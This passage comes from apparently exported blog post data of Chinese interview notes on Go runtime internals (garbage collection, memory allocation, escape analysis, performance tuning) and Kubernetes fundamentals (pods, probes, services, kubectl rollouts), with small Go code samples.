来触发GC，此调用阻塞式地等待当前GC运行完毕。 被动触发，分为两种方式： 使用步调（Pacing）算法，其核心思想是控制内存增长的比例,每次内存分配时检查当前内存分配量是否已达到阈值（环境变量GOGC）：默认100%，即当内存扩大一倍时启用GC。 使用系统监控，当超过两分钟没有产生任何GC时，强制触发 GC。 148. Go 语言什么时候垃圾回收，写代码时，如何减少对象分配对象池：可以使用 sync.Pool 或者自定义对象池来重用对象，避免频繁分配和释放。 必要时使用数组而不是切片：如果你知道元素数量固定，可以使用数组而不是切片，因为切片底层数组可能会导致对象分配。 避免逃逸：逃逸发生在编译器无法确定一个变量的生命周期时，变量将会在堆上分配。尽量避免函数内部的变量逃逸到堆上 使用内置函数：Go 提供了一些内置函数（如 append、copy）来处理切片，它们会在底层做一些优化，避免不必要的分配。 176. Golang 内存分配和管理Go语言内置运行时（就是runtime），抛弃了传统的内存分配方式，改为自主管理。这样可以自主地实现更好的内存使用模式，比如内存池、预分配等等。这样，不会每次内存分配都需要进行系统调用。 Golang运行时的内存分配算法主要源自 Google 为 C 语言开发的TCMalloc算法，全称Thread-Caching Malloc。 核心思想就是把内存分为多级管理，从而降低锁的粒度。它将可用的堆内存采用二级分配的方式进行管理：每个线程都会自行维护一个独立的内存池，进行内存分配时优先从该内存池中分配，当内存池不足时才会向全局内存池申请，以避免不同线程对全局内存池的频繁竞争。 管理如何管理？Go自带GC，可以自动回收垃圾，对比C语言不用malloc申请内存及free释放，Go的GC采取三色标记法动态； Go自动分配内存，开发者可以不用关注堆、栈，Go在编译阶段会做变量的生命周期分析做逃逸分析，自动将变量分配在堆或栈上。 354. go的内存分配机制Go 的内存分配借鉴了 Google 的 TCMalloc 分配算法，其核心思想是内存池 + 多级对象管理。内存池主要是预先分配内存，减少向系统申请的频率；多级对象有：mheap、mspan、arenas、mcentral、mcache。它们以 mspan 作为基本分配单位。具体的分配逻辑如下： 当要分配大于 32K 的对象时，从 mheap 分配。 当要分配的对象小于等于 32K 大于 16B 时，从 P 上的 mcache 分配，如果 mcache 没有内存，则从 mcentral 获取，如果 mcentral 也没有，则向 mheap 申请，如果 mheap 也没有，则从操作系统申请内存。 当要分配的对象小于等于 16B 时，从 mcache 上的微型分配器上分配。324. go的内存分配机制中，有mcentral为什么要mcache 177. 如何避免内存逃逸【合理用指针，设定slice长度】 不要盲目使用变量指针作为参数，虽然减少了复制，但变量逃逸的开销更大。 预先设定好slice长度，避免频繁超出容量，重新分配。 一个经验是，指针指向的数据大部分在堆上分配的，请注意。 出现内存逃逸的情况有： 发送指针或带有指针的值到channel，因为编译时候无法知道那个goroutine会在channel接受数据，编译器无法知道什么时候释放。 在一个切片上存储指针或带指针的值。比如[]*string，导致切片内容逃逸，其引用值一直在堆上。 切片的append导致超出容量，切片重新分配地址，切片背后的存储基于运行时的数据进行扩充，就会在堆上分配。 调用接口类型时，接口类型的方法调用是动态调度，实际使用的具体实现只能在运行时确定，如一个接口类型为io.Reader的变量r，对r.Read(b)的调用将导致r的值和字节片b的后续转义并因此分配到堆上。 在方法内把局部变量指针返回，被外部引用，其生命周期大于栈，导致内存溢出。 237. gc和 delete free 有什么区别，优势？ delete free是手动释放的，一有忘记的就可能导致内存泄漏，产生内存碎片 gc的话是自动释放堆的内存，能有效避免内存泄漏和内存碎片，没有垃圾回收的情况下，程序员可能需要手动释放不再使用的内存，以避免内存碎片的问题 内存碎片是指分配在堆上的内存块中，由于频繁的分配和释放操作，导致堆中的可用内存呈现出碎片化的状态，使得大块的连续内存难以分配。 355. go的性能调优是怎么做的内存优化A、将小对象合并成结构体一次分配，减少内存分配次数 Go runtime底层采用内存池机制，每个span大小为4k，同时维护一个cache。cache有一个0到n的list数组，list数组的每个单元挂载的是一个链表，链表的每个节点就是一块可用的内存块，同一链表中的所有节点内存块都是大小相等的；但是不同链表的内存大小是不等的，即list数组的一个单元存储的是一类固定大小的内存块，不同单元里存储的内存块大小是不等的。cache缓存的是不同类大小的内存对象，申请的内存大小最接近于哪类缓存内存块时，就分配哪类内存块。当cache不够时再向spanalloc中分配。 B、缓存区内容一次分配足够大小空间，并适当复用 在协议编解码时，需要频繁地操作[]byte，可以使用bytes.Buffer或其它byte缓存区对象。bytes.Buffer等通过预先分配足够大的内存，避免当增长时动态申请内存，减少内存分配次数。对于byte缓存区对象需要考虑适当地复用。C、slice和map采make创建时，预估大小指定容量slice和map与数组不一样，不存在固定空间大小，可以根据增加元素来动态扩容。slice初始会指定一个数组，当对slice进行append等操作时，当容量不够时，会自动扩容：如果新的大小是当前大小2倍以上，则容量增涨为新的大小；否则循环以下操作：如果当前容量小于1024，按2倍增加；否则每次按当前容量1/4增涨，直到增涨的容量超过或等新大小。map的扩容比较复杂，每次扩容会增加到上次容量的2倍。map的结构体中有一个buckets和oldbuckets，用于实现增量扩容：正常情况下，直接使用buckets，oldbuckets为空；如果正在扩容，则oldbuckets不为空，buckets是oldbuckets的2倍，因此，建议初始化时预估大小指定容量 D、长调用栈避免申请较多的临时对象 Goroutine的调用栈默认大小是4K（1.7修改为2K），采用连续栈机制，当栈空间不够时，Go runtime会自动扩容：当栈空间不够时，按2倍增加，原有栈的变量会直接copy到新的栈空间，变量指针指向新的空间地址；退栈会释放栈空间的占用，GC时发现栈空间占用不到1/4时，则栈空间减少一半。比如栈的最终大小2M，则极端情况下，就会有10次的扩栈操作，会带来性能下降。因此，建议控制调用栈和函数的复杂度，不要在一个goroutine做完所有逻辑；如的确需要长调用栈，而考虑goroutine池化，避免频繁创建goroutine带来栈空间的变化。 E、避免频繁创建临时对象 Go在GC时会引发stop the world，即整个情况暂停。Go1.8最坏情况下GC为100us。但暂停时间还是取决于临时对象的个数，临时对象数量越多，暂停时间可能越长，并消耗CPU。因此，建议GC优化方式是尽可能地减少临时对象的个数：尽量使用局部变量；所多个局部变量合并一个大的结构体或数组，减少扫描对象的次数，一次回尽可能多的内存。 并发优化A、高并发的任务处理使用goroutine池Goroutine虽然轻量，但对于高并发的轻量任务处理，频繁来创建goroutine来执行，执行效率并不会太高，因为：过多的goroutine创建，会影响go runtime对goroutine调度，以及GC消耗；高并发时若出现调用异常阻塞积压，大量的goroutine短时间积压可能导致程序崩溃。B、避免高并发调用同步系统接口goroutine的实现，是通过同步来模拟异步操作。网络IO、锁、channel、Time.sleep、基于底层系统异步调用的Syscall操作并不会阻塞go runtime的线程调度。本地IO调用、基于底层系统同步调用的Syscall、CGo方式调用C语言动态库中的调用IO或其它阻塞会创建新的调度线程。网络IO可以基于epoll的异步机制（或kqueue等异步机制），但对于一些系统函数并没有提供异步机制。例如常见的posix api中，对文件的操作就是同步操作。虽有开源的fileepoll来模拟异步文件操作。但Go的Syscall还是依赖底层的操作系统的API。系统API没有异步，Go也做不了异步化处理。因此，建议：把涉及到同步调用的goroutine，隔离到可控的goroutine中，而不是直接高并的goroutine调用。C、高并发时避免共享对象互斥传统多线程编程时，当并发冲突在4~8线程时，性能可能会出现拐点。Go推荐不通过共享内存来通信，Go创建goroutine非常容易，当大量goroutine共享同一互斥对象时，也会在某一数量的goroutine出在拐点。因此，建议：goroutine尽量独立，无冲突地执行；若goroutine间存在冲突，则可以采分区来控制goroutine的并发个数，减少同一互斥对象冲突并发数。 其它优化A、避免使用CGO或者减少CGO调用次数GO可以调用C库函数，但Go带有垃圾收集器且Go的栈动态增涨，无法与C无缝地对接。Go的环境转入C代码执行前，必须为C创建一个新的调用栈，把栈变量赋值给C调用栈，调用结束现拷贝回来。调用开销较大，需要维护Go与C的调用上下文，两者调用栈的映射。相比直接的GO调用栈，单纯的调用栈可能有2个甚至3个数量级以上。因此，建议：尽量避免使用CGO，无法避免时，要减少跨CGO的调用次数。B、减少[]byte与string之间转换，尽量采用[]byte来字符串处理GO里面的string类型是一个不可变类型，GO中[]byte与string底层是两个不同的结构，转换存在实实在在的值对象拷贝，所以尽量减少不必要的转化。因此，建议：存在字符串拼接等处理，尽量采用[]byte。C、字符串的拼接优先考虑bytes.Bufferstring类型是一个不可变类型，但拼接会创建新的string。GO中字符串拼接常见有如下几种方式：string + 操作 ：导致多次对象的分配与值拷贝fmt.Sprintf ：会动态解析参数，效率好不哪去strings.Join ：内部是[]byte的appendbytes.Buffer ：可以预先分配大小，减少对象分配与拷贝因此，建议：对于高性能要求，优先考虑bytes.Buffer，预先分配大小。fmt.Sprintf可以简化不同类型转换与拼 500. 写屏障-插入写屏障-删除写屏障-混合写屏障 混合写屏障继承了插入写屏障的优点，起始无需 STW 打快照，直接并发扫 描垃圾即可； 混合写屏障继承了删除写屏障的优点，赋值器是黑色赋值器，GC 期间，任 何在栈上创建的新对象，均为黑色。扫描过一次就不需要扫描了，这样就 消除了插入写屏障时期最后 STW 的重新扫描栈； 混合写屏障扫描精度继承了删除写屏障，比插入写屏障更低，随着带来的 是 GC 过程全程无 STW； 混合写屏障扫描栈虽然没有 STW，但是扫描某一个具体的栈的时候，还是 要停止这个 goroutine 赋值器的工作（针对一个 goroutine 栈来说，是 暂停扫的，要么全灰，要么全黑哈，原子状态切换）。 505. gc流程GCMark 标记准备阶段，为并发标记做准备工作，启动写屏障 STWGCMark 扫描标记阶段，与赋值器并发执行，写屏障开启并发 GCMarkTermination 标记终止阶段，保证一个周期内标记任务完成，停止写屏障 GCoff 内存清扫阶段，将需要回收的内存归还到堆中，写屏障关闭 GCoff 内存归还阶段，将过多的内存归还给操作系统，写屏障关闭。 506. GC是如何调优的Go 内存分配机制？Go 内存逃逸机制？Go 内存对齐机制563. waitgroup的底层实现12345// A WaitGroup must not be copied after first use.type WaitGroup struct &#123; noCopy noCopy state1 [3]uint32&#125; 564. cond实现原理run -race能用于什么【排查逃逸，死锁，数据竞争等】go其他17. 不重启实现热更新根据系统的 SIGHUP 信号量，以此信号量触发进程重启，达到热更新的效果。 热部署我们需要考虑几个能力： 新进程启动成功，老进程不会有资源残留 新进程初始化的过程中，服务不会中断 新进程初始化失败，老进程仍然继续工作 同一时间，只能有一个更新动作执行监听信号量的方法的环境是在 类 UNIX 系统中，在现在的 UNIX 内核中，允许多个进程同时监听一个端口。在收到 SIGHUP 信号量时，先 fork 出一个新的进程监听端口，同时等待旧进程处理完已经进来的连接，最后杀掉旧进程。 示例代码，仓库地址：https://github.com/guowei-gong/tablefilp-example， 如果你希望动手来加深印象可以打开看看。 157. 日志框架logrusgo实现stack 和 set123456789101112131415type Stack struct &#123; data []interface&#123;&#125;&#125;func (s *Stack) Push(item interface&#123;&#125;) &#123; s.data = append(s.data, item)&#125;func (s *Stack) Pop() interface&#123;&#125; &#123; if len(s.data) == 0 &#123; return nil &#125; item := s.data[len(s.data)-1] s.data = s.data[:len(s.data)-1] return item&#125; 12345678910111213type Set map[interface&#123;&#125;]struct&#123;&#125;func (s Set) Add(item interface&#123;&#125;) &#123; s[item] = struct&#123;&#125;&#123;&#125;&#125;func (s Set) Remove(item interface&#123;&#125;) &#123; delete(s, item)&#125;func (s Set) Contains(item interface&#123;&#125;) bool &#123; _, exists := s[item] return exists&#125; 200. 项目上线了，但是发现协程/内存泄漏，如何处理1.goroutine泄漏。2.有一些全局的数据结构意外的挂住了本该释放的对象，虽然goroutine已经退出了，但是这些对象并没有从这类数据结构中删除，导致对象一直被引用，无法被收回。所以发现有内存泄漏的话，具体问题具体分析。 RPC基础讲一下RPC基础： RPC的概念RPC（Romote Procedure Call，远程过程调用），作为分布式系统中不同节点之间的通信方式，是分布式系统的基石之一，RPC不是具体的方法，而是一种解决不同服务之间调用的设计。 基于RPC开发的框架可以称为RPC框架，典型的有谷歌的gRPC、阿里的Dubbo、Facebook的Thrift等，当然成熟的RPC框架还会有服务注册与发现、服务治理、负载均衡等功能。 RPC的四个要素Client服务调用的发起方 Client Stub用于存储要调用的服务器地址、以及将要请求的数据信息打包，通过网络请求发送给Server Stub，然后阻塞，直到接受到返回的数据，然后进行解析。 ServerServer，包含要调用的方法 Server Stub用于接受Client Stub发送的请求数据包并进行解析，完成功能调用，最后将结果进行打包并返回给Client Stub。在没有接受到请求数据包时则处于阻塞状态。 封装了Client Stub和Server Stub后，从Client的角度来看，似乎和本地调用一样。从Server的角度看，似乎就是客户直接调用。 RPC的具体通信步骤Client以类似本地调用的方式调Client StubClient Stub序列化生成消息，然后调用本地操作系统的通信模块， Stub阻塞本地操作系统与远程Server进行通信，消息传输到远程操作系统远程操作系统将消息传递给Server StubServer Stub进行反序列化，然后调用Server的对应方法Server程序执行方法，将结果传递给Server StubServer Stub将结果进行序列化，然后传递给Server操作系统Server操作系统将结果传递给ClientClient操作系统将其交给Client Stub， Stub从阻塞状态恢复Client Stub对结果进行反序列化，并将值返回给Client程序Client程序获得返回结果 乐观锁乐观锁的概念其实很简单，就是在操作一个共享变量时，我们先认为多个线程之间没有冲突 CASCAS是乐观锁的一种实现，CAS全称是比较和替换，CAS的操作主要由以下几个步骤组成： 先查询原始值 操作时比较原始值是否修改 如果修改，则操作失败，禁止更新操作，如果没有发生修改，则更新为新值CAS的缺点CAS虽然在低并发量的情况下可以减少系统的开销，但是CAS也有一些问题： CPU开销过大问题 ABA问题 只能针对一个共享变量CPU开销过大在我们使用CAS时，如果并发量过大，我们的程序有可能会一直自旋，长时间占用CPU资源。ABA问题假设有个共享变量J，原始值为1。 线程A读取变量J，值为1 线程B读取变量J，值为1 线程A变量J+1，CAS成功从1修改为2 线程C读取变量J，值为2 线程C将变量J-1，CAS成功从2修改为1 线程A通过CAS比较和替换，依然可以改为自己想修改的值上述过程，线程B和C已经将变量J的值已经改变了，但是线程A无法发现，依然可以修改共享变量，这就产生了ABA问题。共享变量单一CAS操作单个共享变量的时候可以保证原子的操作，无法操作多个变量。但是在JDK5之后，AtomicReference可以用来保证对象之间的原子性，我们可以把多个对象放入CAS中操作。 如何防止CAS的ABA四个字：加标志位（version）。至于标志位可以是自增的数字，也可以是时间戳。通过标志位我们可以精确的知道每次修改。 go python java的协程区别python协程特点 单线程内切换，适用于IO密集型程序中，能够最大化IO多路复用的效果。 没法利用多核。 协程间彻底同步，不会并行。不须要考虑数据安全。 关键词yield java协程特点go协程特点 协程间须要保证数据安全，好比经过channel或锁。 能够利用多核并行执行。 协程间不彻底同步，能够并行运行，具体要看channel的设计。 抢占式调度，可能没法实现公平。三者区别 java引入了一个虚拟线程的东西，然后结合Thread库的VirtualThread来创建，用JVM管理，用共享内存的方式实现的通信，本质上还是原生thread那一套，golang是原生支持goroutine机制来支持并发的，runtime/GMP模型管理的，python用一个asyncio库实现并发的，awaitable对象实现的通信 性能排查 使用性能分析工具（如pprof）来获取详细的性能数据，了解哪些函数或代码段消耗了大量的时间。 检查缓存、连接、数据库等 日志里也可能有信息## 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889func Goroutine5() &#123; //ctx := context.Background() //quere := make(chan int,1000) q1 := make(chan int) q2 := make(chan int) q3 := make(chan int) q4 := make(chan int) q5 := make(chan int) ch1 := make(chan struct&#123;&#125;) ch2 := make(chan struct&#123;&#125;) ch3 := make(chan struct&#123;&#125;) ch4 := make(chan struct&#123;&#125;) ch5 := make(chan struct&#123;&#125;) suc := make(chan struct&#123;&#125;) oper := func(sort int, in, out chan struct&#123;&#125;, q chan int) &#123; //defer wg.Done() //fmt.Println(sort) for i := range q &#123; &lt;-in fmt.Println(sort, \" print : \", i) //_, ok := &lt;-q //if ok &#123; //fmt.Println(\"sl \", sort) out &lt;- struct&#123;&#125;&#123;&#125; //&#125; &#125; //_, ok := &lt;-out //if ok &#123; // fmt.Println(\"close --------\", sort) // close(out) //&#125; //close(in) fmt.Println(\"close \", sort) &#125; wg := sync.WaitGroup&#123;&#125; wg.Add(1) go func() &#123; //defer wg.Done() go func() &#123; ch1 &lt;- struct&#123;&#125;&#123;&#125; &#125;() for i := 1; i &lt;= 10; i++ &#123; //fmt.Println(i, \"==========\") switch i % 5 &#123; case 1: q1 &lt;- i case 2: q2 &lt;- i case 3: q3 &lt;- i case 4: q4 &lt;- i case 0: q5 &lt;- i &#125; //fmt.Println(\"s\") &#125; close(q1) close(q2) close(q3) close(q4) close(q5) suc &lt;- struct&#123;&#125;&#123;&#125; close(suc) //close(ch1) fmt.Println(\"ws\") &#125;() go func() &#123; defer wg.Done() for s := range suc &#123; fmt.Println(s) for i := range ch1 &#123; fmt.Println(i) close(ch1) &#125; &#125; &#125;() go oper(1, ch1, ch2, q1) go oper(2, ch2, ch3, q2) go oper(3, ch3, ch4, q3) go oper(4, ch4, ch5, q4) go oper(5, ch5, ch1, q5) wg.Wait() fmt.Println(\"suc\", &lt;-ch1)","categories":[{"name":"Golang","slug":"Golang","permalink":"http://waynamigo.github.io/categories/Golang/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://waynamigo.github.io/tags/面试/"},{"name":"go","slug":"go","permalink":"http://waynamigo.github.io/tags/go/"}]},{"title":"Kubernetes Tutorial base knowledge","slug":"2023-01-01-面经dockerk8s","date":"2022-12-31T16:00:00.000Z","updated":"2023-11-21T06:57:02.532Z","comments":true,"path":"2023/01/01/2023-01-01-面经dockerk8s/","link":"","permalink":"http://waynamigo.github.io/2023/01/01/2023-01-01-面经dockerk8s/","excerpt":"本篇为OverView，内容包括kubectl的基础操作，整理的知识框架基于kubernetes官方文档v1.26， 元旦期间系统整理一下。","text":"本篇为OverView，内容包括kubectl的基础操作，整理的知识框架基于kubernetes官方文档v1.26， 元旦期间系统整理一下。 pod生命周期 Pending Runing Succeed Failed Unknown Pending(挂起):API server已经创建pod，但是该pod还有一个或多个容器的镜像没有创建，包括正 在下载镜像的过程; Running(运行中):Pod内所有的容器已经创建，且至少有一个容器处于运行状态、正在启动括正在重 启状态; Succeed(成功):Pod内所有容器均已退出，且不会再重启; Failed(失败):Pod内所有容器均已退出，且至少有一个容器为退出失败状态 Unknown(未知):某于某种原因apiserver无法获取该pod的状态，可能由于网络通行问题导致docker https://zhuanlan.zhihu.com/p/571931032 cgroupCGroups 全称control group， 用来限定一个进程的资源使用， 由 Linux 内核支持，可以限制和隔离Linux进程组 (process groups) 所使用的物理资源，比如cpu，内存，磁盘和网络IO，是Linux container技术的物理基础。 namespace 如果CGroup设计出来的目的是为了隔离上面描述的物理资源，那么namespace则用来隔离PID(进程ID),IPC,Network等系统资源。 将它们分配给特定的Namespace，每个Namespace里面的资源对其他Namespace都是透明的。 不同container内的进程属于不同的Namespace，彼此透明，互不干扰。 unionFS（storage driver：overlay2） unionFS可以把文件系统上多个目录(也叫分支)内容联合挂载到同一个目录下，而目录的物理位置是分开的 借助Linux的unionFS，宿主机只需要在磁盘上保存一份base镜像，内存中也只需要加载一份，就能被所有基于这个镜像的容器共享 k8s是什么K8S 负责自动化运维管理多个 Docker 程序的集群 组件1 etcd分布式键值存储，用于保存Kubernetes集群的所有重要信息，例如配置数据、状态信息等 组件2 apiserver: kube-apiserverkube-apiserver是Kubernetes API的前端，提供了Kubernetes控制平面的统一接口 组件3 controller: kube-controller-managerkube-controller-manager负责管理控制器，这些控制器包括节点控制器、副本控制器、端点控制器等，它们负责保证系统的状态符合用户定义的期望状态 组件4 scheduler: kube-schedulerkube-scheduler负责将Pod调度到具体的节点上，它考虑了诸如资源需求、硬件/软件约束等因素 组件5 kubeletkubelet是每个节点上运行的代理，负责确保Pods按照规定运行 组件6 kube-proxykube-proxy负责维护节点上的网络规则，使得服务可以被正确地路由 组件7 container runtime容器运行时，比如docker，containerd 组件8 container advisor是一个监控代理，用于收集容器资源使用情况和性能数据 【面试题】一个网络请求来了，还没处理要怎么办kube-proxy处理，负责集群内部外部流量，正确路由到正确的pod上，实现高可用 1.etcd是什么？分布式键值存储系统2.etcd适用场景是什么，1. 简述K8s的工作流程 创建一个包含应用程序的Deployment的yml文件，然后通过kubectl客户端工具发送给ApiServer。 ApiServer接收到客户端的请求并将资源内容存储到数据库(etcd)中。 Controller组件(包含scheduler、replication、endpoint)监控资源变化并作出反应。 ReplicaSet检查数据库变化，创建期望数量的pod实例。 Scheduler再次检查数据库变化，发现尚未被分配到具体执行节点(Node)的Pod，然后根据一组相关规则将Pod分配到可以运行它们的节点(Node)上，并更新数据库，记录Pod分配情况。 Kubelet监控数据库变化，管理后续Pod的生命周期，发现被分配到它所在的节点上运行的那些Pod。如果找到新Pod，则会在该节点上运行这个新Pod。例如当有数据发送到主机时，将其路由到正确的pod或容器。2. 简述控制器类型Deployment，StatefulSet，DaemonSet的区别 应用场景 Deployment适用于无状态的应用场景，副本可以动态增加和减少 StatefulSet适用于有状态的应用场景，副本要顺序启动停止 DaemonSet适用于每个节点都运行一个或多个pod的场景 存储 Deployment不需要特别的存储支持 StatefulSet需要为每个Pod提供独立的存储，这可以通过后端存储完成 DaemonSet的每个pod要挂载 volume3. 简述一下k8s的存储管理 持久卷，持久卷声明（PV，PVC）：适用于持久化数据的应用，比如数据库 存储类（StroageClass），根据PVC动态创建PV，适用于需要动态创建存储的场景，如云存储、分布式存储 子路径卷 (Subpath Volume)，多个pod共享存储 本地卷（Local Volume），节点的本地卷映射到pod中，节点间共享存储4. 如何实现滚动更新和回滚【实现平滑升级和故障恢复的手段】 滚动更新逐步将pod下线，由新deployment进行更新1234567891011# 创建pod副本,在执行Deployment和升级的时候最好带上record参数，便于查看历史版本信息。kubectl apply -f abcdocker-test.yaml --record# 更新1.替换镜像版本去更新# 我们可以看到pod执行过程是等待新的pod启动完成，在进行销毁旧的pod，这样就完成了集群的更新工作我们可以看到pod执行过程是等待新的pod启动完成，在进行销毁旧的pod，这样就完成了集群的更新工作sed -i 's#1.13.0-alpine#1.10.0-alpine#g' abcdocker-test.yamlkubectl apply -f abcdocker-test.yaml --record# 更新2.直接更新deployment【不是修改yaml文件】，要用kubctl edit deploymentkubectl get deploymentkubectl edit deployments deployment_name# 更新3. kubctl set替换镜像kubectl set image deployment/SVC_NAME -n namespace_name container_name=images:v1 回滚,使用 kubectl rollout 12kubectl rollout history deployment [deployment_name]查看所有的historykubectl rollout undo deploy_name 5. 如何进行日志管理 使用kubectl的logs，获取制定pod的日志kubectl logs [pod_name] 修改Kube-proxy的配置文件，通常位于/etc/kubernetes/manifests/kube-proxy.yaml将Pod的日志输出到宿主机的日志文件中，一般使用本地卷挂载 重启kube-proxy，使用宿主机的日志轮转工具，logrotate，设置轮转策略sudo logrotate -d /etc/logrotate.d/pod-logs6. 如何进行监控管理 k8s提供了一个metrics，访问这个http请求就返回一个表单，是以#开头的注释行和以指标名称为前缀的键值对 工具有Prometheus比较常用，Grafana进行可视化展示 使用Heapster对Kubernetes集群进行监控数据的采集和存储7. etcd的作用 存储所有资源信息，保证数据的强一致性，作用是数据存储、配置管理、故障恢复 这些资源信息包括：服务发现、分布式锁、分布式数据队列、分布式通知和协调等功能8. etc的基本原理 分布式存储：Etcd采用分布式存储方式，可以配置多节点群集，通过数据同步来保证数据可靠性。 高可用性：Etcd通过选举算法来保证在任何时候都有一个领导者节点负责数据的写入和更新，从而保证了数据的强一致性。 数据持久化：Etcd中的数据会定期进行持久化存储，即使在系统崩溃时也可以保证数据的完整性。9. k8s的kube-scheduler调度器 10. k8s怎样负载均衡的 Kubernetes的内置负载均衡器：Service组件，Service会根据服务后端的Pod IP和端口，将流量均衡地转发给每个Pod。这种方式是基于IP的负载均衡，支持TCP和UDP协议。 用传统的Nginx负载均衡服务器做边车（Sidecar）容器运行，监控流量11. k8s的Labels和Selectors的作用 Label：用于标识和选择资源对象。 附加在资源对象上的键值对标签，标pod，service 标在资源上，可以供Selector进行服务发现，关联选择资源，监控日志等 Selector：用于选择资源，服务发现 12. k8s的Service是什么Service为一组pod定义一个服务的入口地址，提供给前端用Ingress访问这个集群实例，可以起到服务发现，负载均衡，故障隔离的作用。 提供服务的稳定入口：Service为前端的应用程序或者ingress提供了稳定的服务入口，这个入口拥有一个全局唯一的虚拟IP地址，前端的应用可以通过这个IP地址访问后端的Pod集群。 实现负载均衡：Service内部实现了负载均衡机制，它会将所有进入的请求均匀地分配给后端的Pod副本，确保每个请求都能得到正确的响应。 实现故障隔离：当某个Pod发生故障时，Service会自动将该Pod从服务池中剔除，保证请求不会被故障的Pod处理，从而实现了故障隔离。 实现服务发现：Service允许前端的应用程序通过Label Selector来找到提供特定服务的Pod，从而实现了服务的自动发现。 13. Pod周期和状态是什么周期：创建启动运行停止状态：Pending/Running Succeed/Failed Unknown pod1. pod的原理2. pod的特点一个pod是一个最小的部署单元，容器的组合体，这些容器共享网络命名空间和存储卷，并共享生命周期 3. pause容器作用4. pod的重启策略在yaml文件的restartPolicy字段定义，默认是always Always（总是重启）：当容器退出时，无论是正常退出还是异常退出，Kubernetes 将总是重启该容器。这是默认的重启策略。 OnFailure（仅在失败时重启）：当容器以非零的退出代码（表示失败）退出时，Kubernetes 将自动重启该容器。如果容器以零的退出代码（表示成功）退出，Pod 将不会被重启。 ever（永不重启）：当容器退出时，无论是以何种退出代码，Kubernetes 将不会重启该容器。这通常用于一次性任务，确保任务完成后不会再次启动。 5. pod的镜像拉取策略也是三种策略 6. pod的存活探针有哪几种 HTTP 探针通过向容器的指定端口发送 HTTP 请求来检查容器的存活状态。如果返回的 HTTP 状态码表示成功（在指定的范围内），则认为容器是存活的。 TCP 探针通过尝试与容器的指定端口建立 TCP 连接来检查容器的存活状态。如果连接成功，则认为容器是存活的。 Exec 探针通过在容器内执行指定的命令来检查容器的存活状态。如果执行成功，即命令返回零退出码，则认为容器是存活的。7. 存活探针的属性参数8. pod的就绪探针有哪几种9. 就绪探针的属性参数10.就绪探针和存活探针的区别是什么 存活探针是将检查失败的容器杀死，创建新的启动容器来保持pod正常工作 就绪探针是，当就绪探针检查失败，并不重启容器，而是将pod移出endpoint，就绪探针确保了service 中的pod都是可用的，确保客户端只与正常的pod交互并且客户端永远不会知道系统存在问题11. pod创建过程 kubectl run 创建pod 1234561、首先，用户通过kubectl或其他api客户端工具提交需要创建的pod信息给apiserver; 2、apiserver验证客户端的用户权限信息，验证通过开始处理创建请求生成pod对象信息，并将信息存入 etcd，然后返回确认信息给客户端; 3、apiserver开始反馈etcd中pod对象的变化，其他组件使用watch机制跟踪apiserver上的变动; 4、scheduler发现有新的pod对象要创建，开始调用内部算法机制为pod分配最佳的主机，并将结果信息 更新至apiserver; 5、node节点上的kubelet通过watch机制跟踪apiserver发现有pod调度到本节点，尝试调用docker启动 容器，并将结果反馈apiserver;6、apiserver将收到的pod状态信息存入etcd中。 使用deployment创建pod 123456789101112131、kubectl apply -f mydeployment.yaml2、api-server收到创建资源的请求后，会对客户端操作进行身份认证，在客户端的~/.kube文件夹下，已 经设置好了相关的用户认证信息，这样api-server会知道我是哪个用户，并对此用户进行鉴权，当api- server确定客户端的请求合法后，就会接受本次操作，并把相关的信息保存到etcd中，然后返回确认信 息给客户端。 3、apiserver开始反馈etcd中过程创建的对象的变化，其他组件使用watch机制跟踪apiserver上的变动。4、controller-manager组件会监听api-server的信息，controller-manager是有多个类型的，比如 Deployment Controller, 它的作用就是负责监听Deployment，此时Deployment Controller发现有新的deployment要创建，那么它就会去创建一个ReplicaSet，一个ReplicaSet的产生，又被另一个叫做 ReplicaSet Controller监听到了，紧接着它就会去分析ReplicaSet的语义，它了解到是要依照ReplicaSet 的template去创建Pod, 它一看这个Pod并不存在，那么就新建此Pod，当Pod刚被创建时，它的 nodeName属性值为空，代表着此Pod未被调度。 5、调度器Scheduler组件开始介入工作，Scheduler也是通过watch机制跟踪apiserver上的变动，发现 有未调度的Pod，则根据内部算法、节点资源情况，pod定义的亲和性反亲和性等等，调度器会综合的选 出一批候选节点，在候选节点中选择一个最优的节点，然后将pod绑定该该节点，将信息反馈给api- server。6、kubelet组件布署于Node之上，它也是通过watch机制跟踪apiserver上的变动，监听到有一个Pod应 该要被调度到自身所在Node上来，kubelet首先判断本地是否在此Pod，如果不存在，则会进入创建Pod 流程，创建Pod有分为几种情况，第一种是容器不需要挂载外部存储，则相当于直接docker run把容器 启动，但不会直接挂载docker网络，而是通过CNI调用网络插件配置容器网络，如果需要挂载外部存 储，则还要调用CSI来挂载存储。kubelet创建完pod，将信息反馈给api-server，api-servier将pod信息 写入etcd7、Pod建立成功后，ReplicaSet Controller会对其持续进行关注，如果Pod因意外或被我们手动退出， ReplicaSet Controller会知道，并创建新的Pod，以保持replicas数量期望值。 12.pod的终止过程 用户向apiserver发送pod删除的命令 kubectl监控pod为terminating状态，就启动关闭pod过程 endpoint控制器监控pod对象的关闭行为时，讲所有资源从endpoint列表删除 如果当前pod对象定义了preStop钩子处理器，则在其被标记为terminating后会意同步的方式启动执行 pod对象容器进程收到了停止信息 宽限期过后，kubelet请求apiserver讲pod资源宽限期设0，对用户不可见13. pod的初始化容器 init container 负责在主应用容器启动之前执行一些预处理工作或者初始化任务，挂载volume，等待外部服务就绪，安全检查等14.pod的资源请求、限制如何定义resources下的limits和requests，cpu核数和内存大小service1. service如何与pod关联pod后跟了label，然后service使用标签选择器，selector选择关联哪些pod作为后段2. service的域名解析格式&lt;service-name&gt;.&lt;namespace&gt;.svc.&lt;cluster-domain&gt; &lt;service-name&gt; 是服务的名称，是在创建服务时指定的。 &lt;namespace&gt; 是服务所在的命名空间，默认为 “default”。 &lt;cluster-domain&gt; 是集群的域名，通常为 “cluster.local”。3. service的类型 一般情况下service都是ClusterIP类型的，通过ingress接入的外部流量 ClusterIP：仅供集群内部使用，默认ClusterIP NodePort：service可以对外访问应用，在每个节点暴露一个端口，外部访问任意NodeIP:port就可以脸上service LoadBalancer：service对外访问应用，公有云环境下，需要公网IP地址 ExternalName:这种类型的service会把集群外部的服务引入集群内部，这样集群内直接访问service就 可以间接的使用集群外部服务了4. 一个应用pod如何连接service 环境变量，配置注入 DNS方式，k8s集群内有DNS服务器5. 